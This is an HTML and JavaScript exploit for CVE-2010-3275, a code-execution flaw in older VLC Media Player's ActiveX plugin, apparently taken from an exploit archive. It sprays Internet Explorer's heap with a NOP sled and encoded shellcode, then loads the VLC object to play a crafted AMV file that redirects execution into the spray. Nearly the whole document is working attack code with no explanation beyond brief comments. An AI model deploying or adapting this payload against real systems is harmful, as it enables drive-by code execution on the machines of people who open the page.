<!-- 
# Title: VideoLAN VLC Media Player before 1.1.8 Arbitrary Code Execution
# Author: Alejandro Parodi / hdbreaker
# Date: 2018-08-17
# Vendor Homepage: https://www.vlc.com
# Software Link: https://www.videolan.org/vlc/releases/1.1.8.html
# Version: v1.1.8
# Tested on: Windows7 x86
# CVE: CVE-2010-3275
# References: 
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3275
-->

<html>
<head>
<script src="heapLib.js"></script>
<script>
var heap = new heapLib.ie(0x20000);
heap.gc()

function spray_address(){
	var nops = unescape("%u3032%u370A")
	while (nops.length < 0x200) nops += nops
	nops = nops.substring(0, 0x200)
	return nops
}

function spray_shellcode(){
	var nopsleed = unescape("%u9090%u9090")
	while (nopsleed.length < 0x191) nopsleed += nopsleed
	nopsleed = nopsleed.substring(0, 0x191);
	var shellcode = unescape("%uc931%ue983%ue8d0%uffff%uffff%u5ec0%u7681%u450e%ude6a%u830c%ufcee%uf4e2%u82b9%u0c5c%u6a45%u85be%u5ba0%u681e%u3ace%u87ee%u6617%u5e55%ue151%u24ac%udd4a%u2a94%u9574%u3072%u1624%u20dc%uab65%u0111%uad44%ufe3c%u3d17%u5e55%ue155%u3094%u26ce%u74cf%u22a6%udddf%ue114%u2c87%ub944%u4555%u895d%u45e4%u5ece%u0d55%u5b93%ua021%ua584%u0dd3%u5282%u793e%u69b3%uf4a3%u177e%u79fa%u32a1%u5455%u6b61%u6a0d%u66ce%u8795%u761d%udfdf%u6ece%u0d55%ue395%u289a%u3161%u6d85%u301c%uf38f%u35a5%u5681%u78ce%u8135%u0018%u81df%ud8c0%u0cde%u3a45%u3db6%u05ce%uf359%ud190%ub92e%u3ce7%uaab6%ud7d0%uf343%u5690%u70d8%uea4f%uec25%u6f30%u4b65%u1856%u66b1%u3945%ud921%u0b26%u6fb2%u6a45%u0cde"); // 108 bytes
	shellcode = shellcode.substring(0, shellcode.length)
	shellcode = nopsleed + shellcode
	return shellcode
}

//Crash in call [edx+80]
//Pointer to 3032344A+80
var payload = spray_address() + spray_shellcode() //must be a size of 1021 bytes

for(var i=0; i<0x49000; i++){ // Spray the max posible without get the stop script message
	var block = payload.substring(0, payload.length)
	heap.alloc(payload)
}

</script>
</head>
<body>
    <object id="vlc" classid="clsid:9BE31822-FDAD-461B-AD51-BE1D1C159921" codebase="http://download.videolan.org/pub/videolan/vlc/last/win32/axvlc.cab">
        <param name="autostart" value="true" />
        <param name="allowfullscreen" value="false" />
    </object>
    <script type="text/javascript">
    	var vlc = document.getElementById("vlc");
    	var video = vlc.playlist.add("vlc.amv")
    	vlc.playlist.playItem(video);
    </script>
</body>
</htlm>
